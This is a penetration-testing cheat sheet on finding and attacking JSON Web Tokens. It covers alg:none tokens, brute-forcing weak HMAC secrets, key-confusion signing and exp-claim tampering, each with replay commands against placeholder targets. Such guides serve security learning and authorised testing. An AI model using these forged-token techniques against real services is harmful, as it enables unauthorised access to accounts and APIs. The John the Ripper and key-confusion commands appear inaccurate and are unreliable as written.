## Identifying JWT Usage

!!! tip "Tip"
    Try `alg: none` first — some libraries still accept unsigned tokens. If RS256 is used, check if the public key is exposed (e.g. `/jwks.json`) and try switching to HS256 signed with the public key as the secret.

!!! warning "Watch out"
    JWT signature validation failures often return a generic 401 — confirm you're actually testing the right field by checking what the app decodes, not just what it rejects.

### Using Burp Suite

- Capture requests and inspect the **Authorization** header.
- Look for `Authorization: Bearer <JWT>`.

### Extracting JWT from cURL Responses

```
curl -v http://<target-ip>/api -H "Authorization: Bearer <JWT>"
```

- `-v` → Enables verbose output to inspect headers.
### Decoding a JWT

```
echo "<JWT Token>" | jwt_tool -d
```

## Common JWT Attacks

### None Algorithm Attack

If the server does not validate the algorithm field properly, change it to `none` and remove the signature.

```
{
  "alg": "none",
  "typ": "JWT"
}
```

Replay the modified token:

```
curl -H "Authorization: Bearer <MODIFIED_JWT>" http://target.com/api
```

### Signature Forgery with Weak Secrets

If a weak secret is used to sign the JWT, brute-force it with **John the Ripper**:

```
echo "<JWT_SECRET>" > jwt_secret.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt_secret.txt
```

- Attempts to recover the secret key.
### Key Confusion Attack

If the server accepts **public keys** for verification, attempt to sign the JWT with a known key.

```
jwt_tool -I -S rsa256 -pk mypublic.pem
```

- `-I` → Interactively modifies the JWT.
- `-S rsa256` → Uses the RSA256 signing algorithm.

### Token Expiry Manipulation

If the server does not properly validate token expiration (`exp` claim), modify and replay it:

```
{
  "exp": 9999999999
}
```

Encode and replay:

```
curl -H "Authorization: Bearer <MODIFIED_JWT>" http://target.com/api
```
